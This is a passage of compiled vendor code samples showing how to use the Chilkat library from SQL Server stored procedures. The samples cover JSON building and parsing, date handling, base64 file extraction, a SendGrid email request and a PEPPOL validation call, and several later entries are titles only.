    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.Expiration', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.StartTime', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    --  Output:

    --  month=1, day=30, year=2018, hour=20, minute=35
    --  month=4, day=24, year=2018, hour=13, minute=47
    --  month=1, day=30, year=2018, hour=20, minute=35
    --  month=4, day=24, year=2018, hour=13, minute=47
    --  month=11, day=6, year=2015, hour=18, minute=36
    --  month=9, day=21, year=2015, hour=23, minute=18
    --  month=2, day=17, year=2018, hour=11, minute=37

    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @dateTime
    EXEC @hr = sp_OADestroy @dt


END
GO


https://www.example-code.com/sql/json_insert_empty_array_or_object.asp


(SQL Server) JSON Insert Empty Array or Object
Demonstrates how to use the UpdateNewArray and UpdateNewObject methods to insert an empty array or object.

Note: The UpdateNewArray an UpdateNewObject methods were introduced in Chilkat v9.5.0.75.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int

    --  The following code builds the following JSON, which contains both an empty array and empty object:

    --  	{
    --  	  "abc": {
    --  	    "xyz": [
    --  	      {
    --  	        "Name": "myName",
    --  	        "Description": "description",
    --  	        "ScheduleDefinition": "schedule definition",
    --  	        "ExceptionScheduleDefinition": "",
    --  	        "Attribute": [
    --  	        ],
    --  	        "SomeEmptyObject": {},
    --  	        "token": "token"
    --  	      }
    --  	    ]
    --  	  }
    --  	}

    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'abc.xyz[0].Name', 'myName'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'abc.xyz[0].Description', 'description'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'abc.xyz[0].ScheduleDefinition', 'schedule definition'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'abc.xyz[0].ExceptionScheduleDefinition', ''
    EXEC sp_OAMethod @json, 'UpdateNewArray', @success OUT, 'abc.xyz[0].Attribute'
    EXEC sp_OAMethod @json, 'UpdateNewObject', @success OUT, 'abc.xyz[0].SomeEmptyObject'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'abc.xyz[0].token', 'token'

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_create_array_of_objects.asp


(SQL Server) Create a JSON Array of Objects
Demonstrates how to create a JSON array of objects.



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @arr int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @arr OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int

    -- Add an empty object at the 1st JSON array position.
    EXEC sp_OAMethod @arr, 'AddObjectAt', @success OUT, 0
    -- Get the object we just created.
    DECLARE @obj int
    EXEC sp_OAMethod @arr, 'ObjectAt', @obj OUT, 0
    EXEC sp_OAMethod @obj, 'UpdateString', @success OUT, 'Name', 'Otto'
    EXEC sp_OAMethod @obj, 'UpdateInt', @success OUT, 'Age', 29
    EXEC sp_OAMethod @obj, 'UpdateBool', @success OUT, 'Married', 0
    EXEC @hr = sp_OADestroy @obj

    -- Add an empty object at the 2nd JSON array position.
    EXEC sp_OAMethod @arr, 'AddObjectAt', @success OUT, 1
    EXEC sp_OAMethod @arr, 'ObjectAt', @obj OUT, 1
    EXEC sp_OAMethod @obj, 'UpdateString', @success OUT, 'Name', 'Connor'
    EXEC sp_OAMethod @obj, 'UpdateInt', @success OUT, 'Age', 43
    EXEC sp_OAMethod @obj, 'UpdateBool', @success OUT, 'Married', 1
    EXEC @hr = sp_OADestroy @obj

    -- Add an empty object at the 3rd JSON array position.
    EXEC sp_OAMethod @arr, 'AddObjectAt', @success OUT, 2
    EXEC sp_OAMethod @arr, 'ObjectAt', @obj OUT, 2
    EXEC sp_OAMethod @obj, 'UpdateString', @success OUT, 'Name', 'Ramona'
    EXEC sp_OAMethod @obj, 'UpdateInt', @success OUT, 'Age', 34
    EXEC sp_OAMethod @obj, 'UpdateBool', @success OUT, 'Married', 1
    EXEC @hr = sp_OADestroy @obj

    -- Examine what we have:
    EXEC sp_OASetProperty @arr, 'EmitCompact', 0
    EXEC sp_OAMethod @arr, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    -- The output is:

    -- [
    --   {
    --     "Name": "Otto",
    --     "Age": 29,
    --     "Married": false
    --   },
    --   {
    --     "Name": "Connor",
    --     "Age": 43,
    --     "Married": true
    --   },
    --   {
    --     "Name": "Ramona",
    --     "Age": 34,
    --     "Married": true
    --   }
    -- ]

    EXEC @hr = sp_OADestroy @arr


END
GO


https://www.example-code.com/sql/json_swap_objects.asp


(SQL Server) Swap JSON Objects
Demonstrates how to swap two JSON objects within a JSON document.

Note: This example requires Chilkat v9.5.0.76 or greater.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  Load the following JSON:

    --  {
    --    "petter": {
    --      "DOB": "26/02/1986",
    --      "gender": "male",
    --      "country": "US"
    --    },
    --    "Sara": {
    --      "DOB": "13/05/1982",
    --      "gender": "female",
    --      "country": "FR"
    --    },
    --    "Jon": {
    --      "DOB": "19/03/1984",
    --      "gender": "male",
    --      "country": "UK"
    --    }
    --  }

    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/people.json'
    --  Assume success..

    --  Swap the positions of Jon and Sara.
    DECLARE @index1 int
    EXEC sp_OAMethod @json, 'IndexOf', @index1 OUT, 'Jon'
    DECLARE @index2 int
    EXEC sp_OAMethod @json, 'IndexOf', @index2 OUT, 'Sara'
    EXEC sp_OAMethod @json, 'Swap', @success OUT, @index1, @index2

    --  We have this now:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  {
    --    "petter": {
    --      "DOB": "26/02/1986",
    --      "gender": "male",
    --      "country": "US"
    --    },
    --    "Jon": {
    --      "DOB": "19/03/1984",
    --      "gender": "male",
    --      "country": "UK"
    --    },
    --    "Sara": {
    --      "DOB": "13/05/1982",
    --      "gender": "female",
    --      "country": "FR"
    --    }
    --  }

    --  To swap an inner member:
    DECLARE @jsonSara int
    EXEC sp_OAMethod @json, 'ObjectOf', @jsonSara OUT, 'Sara'
    EXEC sp_OAMethod @jsonSara, 'IndexOf', @index1 OUT, 'DOB'
    EXEC sp_OAMethod @jsonSara, 'IndexOf', @index2 OUT, 'country'
    EXEC sp_OAMethod @jsonSara, 'Swap', @success OUT, @index1, @index2
    EXEC @hr = sp_OADestroy @jsonSara

    --  We now have this:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  {
    --    "petter": {
    --      "DOB": "26/02/1986",
    --      "gender": "male",
    --      "country": "US"
    --    },
    --    "Jon": {
    --      "DOB": "19/03/1984",
    --      "gender": "male",
    --      "country": "UK"
    --    },
    --    "Sara": {
    --      "country": "FR",
    --      "gender": "female",
    --      "DOB": "13/05/1982"
    --    }
    --  }

    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/parse_microsoft_json_date.asp

(SQL Server) Parse a Microsoft JSON Date (MS AJAX Date)
Demonstrates how to parse a Microsoft JSON Date, also known as an MSAJAX date.

Note: This example requires Chilkat v9.5.0.76 or greater.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    --  Note: This example requires Chilkat v9.5.0.76 or greater.
    --  The ability to automatically parse Microsoft JSON Dates (AJAX Dates) was added in v9.5.0.76
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @json, 'Load', @success OUT, '{ "AchievementDate":"/Date(1540229468330-0500)/"}'

    DECLARE @dt int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.CkDateTime', @dt OUT

    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'AchievementDate', @dt
    IF @success <> 1
      BEGIN

        PRINT 'Unable to parse a date/time.'
        EXEC @hr = sp_OADestroy @json
        EXEC @hr = sp_OADestroy @dt
        RETURN
      END

    --  Show the date in different formats:
    DECLARE @bLocal int
    SELECT @bLocal = 1

    EXEC sp_OAMethod @dt, 'GetAsRfc822', @sTmp0 OUT, @bLocal
    PRINT 'RFC822: ' + @sTmp0

    EXEC sp_OAMethod @dt, 'GetAsTimestamp', @sTmp0 OUT, @bLocal
    PRINT 'Timestamp: ' + @sTmp0

    EXEC sp_OAMethod @dt, 'GetAsIso8601', @sTmp0 OUT, 'YYYY-MM-DD', @bLocal
    PRINT 'YYYY-MM-DD: ' + @sTmp0

    --  Get integer values for year, month, day, etc.
    DECLARE @dtObj int
    EXEC sp_OAMethod @dt, 'GetDtObj', @dtObj OUT, @bLocal

    EXEC sp_OAGetProperty @dtObj, 'Year', @iTmp0 OUT
    PRINT 'year: ' + @iTmp0

    EXEC sp_OAGetProperty @dtObj, 'Month', @iTmp0 OUT
    PRINT 'month: ' + @iTmp0

    EXEC sp_OAGetProperty @dtObj, 'Day', @iTmp0 OUT
    PRINT 'day: ' + @iTmp0

    EXEC sp_OAGetProperty @dtObj, 'Hour', @iTmp0 OUT
    PRINT 'hour: ' + @iTmp0

    EXEC sp_OAGetProperty @dtObj, 'Minute', @iTmp0 OUT
    PRINT 'minute: ' + @iTmp0

    EXEC sp_OAGetProperty @dtObj, 'Second', @iTmp0 OUT
    PRINT 'seconds: ' + @iTmp0

    EXEC @hr = sp_OADestroy @dtObj

    --  Sample output:
    --  RFC822: Mon, 22 Oct 2018 17:31:08 -0500
    --  Timestamp: 2018-10-22T17:31:08-05:00
    --  YYYY-MM-DD: 2018-10-22
    --  year: 2018
    --  month: 10
    --  day: 22
    --  hour: 17
    --  minute: 31
    --  seconds: 8

    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @dt


END
GO


https://www.example-code.com/sql/extract_pdf_from_json.asp


(SQL Server) Extract PDF from JSON
Demonstrates how to extract a PDF file contained within JSON. The file is represented as a base64 string within the JSON. Note: This example can extract any type of file, not just a PDF file.

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Load the JSON.
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/JSR5U.json'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    -- The JSON we loaded contains this:

    -- 	{
    -- 	...
    -- 	...
    -- 	  "data": {
    -- 	    "content": "JVBERi0xLjQ..."
    -- 	  }
    -- 	...
    -- 	...
    -- 	}

    DECLARE @sb int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sb OUT

    EXEC sp_OAMethod @json, 'StringOfSb', @success OUT, 'data.content', @sb

    DECLARE @bd int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @bd OUT

    EXEC sp_OAMethod @bd, 'AppendEncodedSb', @success OUT, @sb, 'base64'

    EXEC sp_OAMethod @bd, 'WriteFile', @success OUT, 'qa_output/a0015.pdf'

    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @sb
    EXEC @hr = sp_OADestroy @bd


END
GO

https://www.example-code.com/sql/json_decode_html_entities.asp


(SQL Server) Decode HTML Entity Encoded JSON
Decodes an HTML entity encoded string to JSON.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @sb int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sb OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @sb, 'Append', @success OUT, '{&quot;xyz&quot;: &quot;abc&quot;}'

    EXEC sp_OAMethod @sb, 'EntityDecode', @success OUT

    EXEC sp_OAMethod @sb, 'GetAsString', @sTmp0 OUT
    PRINT @sTmp0

    -- Output is:

    -- {"xyz": "abc"}

    EXEC @hr = sp_OADestroy @sb


END
GO


https://www.example-code.com/sql/json_array_of_strings.asp


(SQL Server) Create JSON Array of Strings
Demonstrates how to create a JSON array of strings.



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- The goal of this example is to produce this:

    -- [
    --   "tag1",
    --   "tag2",
    --   "tag3"
    -- ]

    DECLARE @jarr int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @jarr OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @jarr, 'AddStringAt', @success OUT, -1, 'tag1'
    EXEC sp_OAMethod @jarr, 'AddStringAt', @success OUT, -1, 'tag2'
    EXEC sp_OAMethod @jarr, 'AddStringAt', @success OUT, -1, 'tag3'

    EXEC sp_OASetProperty @jarr, 'EmitCompact', 0
    EXEC sp_OAMethod @jarr, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @jarr


END
GO


https://www.example-code.com/sql/json_iterate_value_member_names.asp

(SQL Server) Iterate JSON where Member Names are Data Values
Demonstrates how to parse JSON where member names are not keywords, but instead are data values.



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'valuesAsNames.json'

    -- Imagine we have JSON such as the following:

    -- {
    --   "1680": {
    --     "entity_id": "1680",
    --     "type_id": "simple",
    --     "sku": "123"
    --   },
    --   "1701": {
    --     "entity_id": "1701",
    --     "type_id": "simple",
    --     "sku": "456"
    --   }
    -- }
    -- 

    -- This presents a parsing problem because the member names, such as "1680"
    -- are not keywords.  Instead they are data values.  We don't know what they
    -- may be in advance.  

    -- To solve, we iterate over the members, get the name of each, ...
    DECLARE @numMembers int
    EXEC sp_OAGetProperty @json, 'Size', @numMembers OUT
    DECLARE @i int

    SELECT @i = 0
    WHILE @i <= @numMembers - 1
      BEGIN

        DECLARE @name nvarchar(4000)
        EXEC sp_OAMethod @json, 'NameAt', @name OUT, @i


        PRINT @name + ':'
        DECLARE @jRecord int
        EXEC sp_OAMethod @json, 'ObjectAt', @jRecord OUT, @i


        EXEC sp_OAMethod @jRecord, 'StringOf', @sTmp0 OUT, 'entity_id'
        PRINT 'entity_id: ' + @sTmp0

        EXEC sp_OAMethod @jRecord, 'StringOf', @sTmp0 OUT, 'type_id'
        PRINT 'type_id: ' + @sTmp0

        EXEC sp_OAMethod @jRecord, 'StringOf', @sTmp0 OUT, 'sku'
        PRINT 'sku: ' + @sTmp0

        EXEC @hr = sp_OADestroy @jRecord

        SELECT @i = @i + 1
      END

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_append_to_array.asp


(SQL Server) Append New Item to JSON Array
Demonstrates the notations that can be used in a JSON array index to append to the end of an array.

CREATE PROCEDURE json_append_to_array
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- Starting in Chilkat v9.5.0.77, the following notations are possible to specify that the value
    -- should be appended to the end of the array. (In other words, if the array currenty has N elements, then "-1", "", or "*" 
    -- indicate an index of N+1.

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'lanes[-1]', 0
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'lanes[]', 1
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'lanes[*]', 2
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'lanes[-1]', 3

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    -- Output is:  {"lanes":[0,1,2,3]}

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_with_binary_data.asp

(SQL Server) Read/Write JSON with Binary Data such as JPEG Files
Demonstrates how binary files could be stored in JSON in base64 format. Creates JSON containing the contents of a JPG file, and then reads the JSON to extract the JPEG image.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    -- First load a small JPG file..
    DECLARE @bd int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @bd OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @bd, 'LoadFile', @success OUT, 'qa_data/jpg/starfish20.jpg'
    -- Assume success, but your code should check for success..

    -- Create JSON containing the binary data in base64 format.
    DECLARE @json1 int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json1 OUT

    EXEC sp_OAMethod @json1, 'UpdateBd', @success OUT, 'starfish', 'base64', @bd

    DECLARE @jsonStr nvarchar(4000)
    EXEC sp_OAMethod @json1, 'Emit', @jsonStr OUT

    PRINT @jsonStr

    -- Here's the output:
    -- {"starfish":"/9j/4AAQSkZJRgA ... cN2iuLFsCEbDGxQkI6RO/n//2Q=="}

    -- Let's create a new JSON object, load it with the above JSON, and extract the JPG image..
    DECLARE @json2 int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json2 OUT

    EXEC sp_OAMethod @json2, 'Load', @success OUT, @jsonStr

    -- Get the binary bytes.
    DECLARE @bd2 int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @bd2 OUT

    EXEC sp_OAMethod @json2, 'BytesOf', @success OUT, 'starfish', 'base64', @bd2

    -- Save to a file.
    EXEC sp_OAMethod @bd2, 'WriteFile', @success OUT, 'qa_output/starfish20.jpg'


    PRINT 'Success.'

    EXEC @hr = sp_OADestroy @bd
    EXEC @hr = sp_OADestroy @json1
    EXEC @hr = sp_OADestroy @json2
    EXEC @hr = sp_OADestroy @bd2


END
GO




https://www.example-code.com/sql/sendgrid_html_email.asp

SendGrid HTML Email with Embedded Images

Demonstrates how to send an HTML email with embedded images using SendGrid.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code

    DECLARE @req int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HttpRequest', @req OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT

    DECLARE @success int

    -- First.. load a JPG file and build an HTML img tag with the JPG data inline encoded.
    -- Our HTML img tag will look like this:
    -- <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEA3ADcAA..." alt="" style="border-width:0px;" />
    DECLARE @bdJpg int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @bdJpg OUT

    EXEC sp_OAMethod @bdJpg, 'LoadFile', @success OUT, 'qa_data/jpg/starfish.jpg'
    IF @success = 0
      BEGIN

        PRINT 'Failed to load JPG file.'
        EXEC @hr = sp_OADestroy @req
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @bdJpg
        RETURN
      END

    DECLARE @sbHtml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sbHtml OUT

    EXEC sp_OAMethod @sbHtml, 'Append', @success OUT, '<html><body><b>This is a test<b><br /><img src="data:image/jpeg;base64,'
    -- Append the base64 image data to sbHtml.
    EXEC sp_OAMethod @bdJpg, 'GetEncodedSb', @success OUT, 'base64', @sbHtml
    EXEC sp_OAMethod @sbHtml, 'Append', @success OUT, '" alt="" style="border-width:0px;" /></body></html>'

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT

    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'personalizations[0].to[0].email', 'matt@chilkat.io'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'from.email', 'admin@chilkatsoft.com'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'subject', 'Test HTML email with images'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'content[0].type', 'text/html'
    EXEC sp_OAMethod @json, 'UpdateSb', @success OUT, 'content[0].value', @sbHtml

    EXEC sp_OASetProperty @http, 'AuthToken', 'SENDGRID_API_KEY'

    DECLARE @resp int

    EXEC sp_OAMethod @http, 'PostJson3', @resp OUT, 'https://api.sendgrid.com/v3/mail/send', 'application/json', @json
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
      END
    ELSE
      BEGIN
        -- Display the JSON response.
        EXEC sp_OAGetProperty @resp, 'BodyStr', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @resp

      END

    EXEC @hr = sp_OADestroy @req
    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @bdJpg
    EXEC @hr = sp_OADestroy @sbHtml
    EXEC @hr = sp_OADestroy @json


END
GO

https://www.example-code.com/sql/peppol_document_validation.asp



PEPPOL Document Validation



Demonstrates how to call a Web service to validate your PEPPOL documents according to the latest PEPPOL rules. The validation service requires UBL files.

For more information, see https://peppol.helger.com/public/locale-en_US/menuitem-validation-ws2


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat HTTP API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- We are sending the following POST:

    -- POST /wsdvs HTTP/1.1
    -- Host: peppol.helger.com
    -- Content-Type: application/soap+xml; charset=utf-8
    -- Content-Length: <length>
    -- 
    -- <?xml version="1.0"?>
    -- <S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
    -- <S:Body>
    -- <validateRequestInput xmlns="http://peppol.helger.com/ws/documentvalidationservice/201701/" VESID="eu.peppol.bis2:t10:3.3.0" displayLocale="en">
    -- <XML>...ENTITY_ENCODED_INVOICE_XML_GOES_HERE...</XML>
    -- </validateRequestInput>
    -- </S:Body>
    -- </S:Envelope>

    -- Build the SOAP XML shown above.
    -- First load the PEPPOL invoice that will be the data contained in the <XML>...</XML> SOAP element.
    -- We are using the XML invoice obtained from https://github.com/austriapro/ebinterface-standards/blob/master/schemas/ebInterface5p0/samples/ebinterface_5p0_sample_ecosio.xml
    DECLARE @sbPeppolInvoiceXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sbPeppolInvoiceXml OUT

    DECLARE @success int
    EXEC sp_OAMethod @sbPeppolInvoiceXml, 'LoadFile', @success OUT, 'qa_data/xml/peppol_invoice.xml', 'utf-8'

    DECLARE @xml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xml OUT

    EXEC sp_OASetProperty @xml, 'Tag', 'S:Envelope'
    EXEC sp_OAMethod @xml, 'AddAttribute', @success OUT, 'xmlns:S', 'http://schemas.xmlsoap.org/soap/envelope/'
    EXEC sp_OAMethod @xml, 'UpdateAttrAt', @success OUT, 'S:Body|validateRequestInput', 1, 'xmlns', 'http://peppol.helger.com/ws/documentvalidationservice/201701/'
    EXEC sp_OAMethod @xml, 'UpdateAttrAt', @success OUT, 'S:Body|validateRequestInput', 1, 'VESID', 'at.ebinterface:invoice:5.0'
    EXEC sp_OAMethod @xml, 'UpdateAttrAt', @success OUT, 'S:Body|validateRequestInput', 1, 'displayLocale', 'en'
    EXEC sp_OAMethod @sbPeppolInvoiceXml, 'GetAsString', @sTmp0 OUT
    EXEC sp_OAMethod @xml, 'UpdateChildContent', NULL, 'S:Body|validateRequestInput|XML', @sTmp0

    -- Set the Content-Type of the request.
    EXEC sp_OAMethod @http, 'SetRequestHeader', NULL, 'Content-Type', 'text/xml'

    -- We don't need to specify the Content-Length or Host headers.  Chilkat automatically adds them.

    -- Send the request...
    DECLARE @resp int
    EXEC sp_OAMethod @xml, 'GetXml', @sTmp0 OUT
    EXEC sp_OAMethod @http, 'PostXml', @resp OUT, 'https://peppol.helger.com/wsdvs', @sTmp0, 'utf-8'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @sbPeppolInvoiceXml
        EXEC @hr = sp_OADestroy @xml
        RETURN
      END


    EXEC sp_OAGetProperty @resp, 'StatusCode', @iTmp0 OUT
    PRINT 'Response Status Code = ' + @iTmp0

    DECLARE @respXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @respXml OUT

    EXEC sp_OAGetProperty @resp, 'BodyStr', @sTmp0 OUT
    EXEC sp_OAMethod @respXml, 'LoadXml', @success OUT, @sTmp0
    EXEC @hr = sp_OADestroy @resp


    PRINT 'Response XML:'
    EXEC sp_OAMethod @respXml, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0

    -- A success repsonse looks like this:

    -- <?xml version="1.0" encoding="UTF-8"?>
    -- <S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
    --     <S:Body>
    --         <validateResponseOutput xmlns="http://peppol.helger.com/ws/documentvalidationservice/201701/" success="true" interrupted="false" mostSevereErrorLevel="SUCCESS">
    --             <Result success="true" artifactType="xsd" artifactPath="/schemas/ebinterface/ebinterface-5.0.xsd"/>
    --         </validateResponseOutput>
    --     </S:Body>
    -- </S:Envelope>

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @sbPeppolInvoiceXml
    EXEC @hr = sp_OADestroy @xml
    EXEC @hr = sp_OADestroy @respXml


END
GO




https://www.example-code.com/sql/win_air_freight_login.asp


WIN Air Freight Login POST Request

Demonstrates the "login" POST method endpoint to obtain an initial authToken as a cookie. Each API request will return a fresh authToken cookie which must be passed back to WIN in the next API request.





https://www.example-code.com/sql/win_air_freight_new_pouch.asp


WIN Air Freight - Send New Pouch Request

Sends a "POST /api/v1/Awb" to send a new pouch request.


https://www.example-code.com/sql/charturl_signed_url.asp


ChartURL - Create a Signed URL


https://www.example-code.com/sql/etrade_oauth1.asp


ETrade OAuth1 Authorization (3-legged) Step 1


https://www.example-code.com/sql/etrade_oauth1_step2.asp


ETrade OAuth1 Authorization (3-legged) Step 2


https://www.example-code.com/sql/etrade_v1_list_accounts.asp


ETrade v1 List Accounts

List ETrade accounts using the ETrade v1 API.


CREATE PROCEDURE etrade_v1_list_accounts
AS
BEGIN
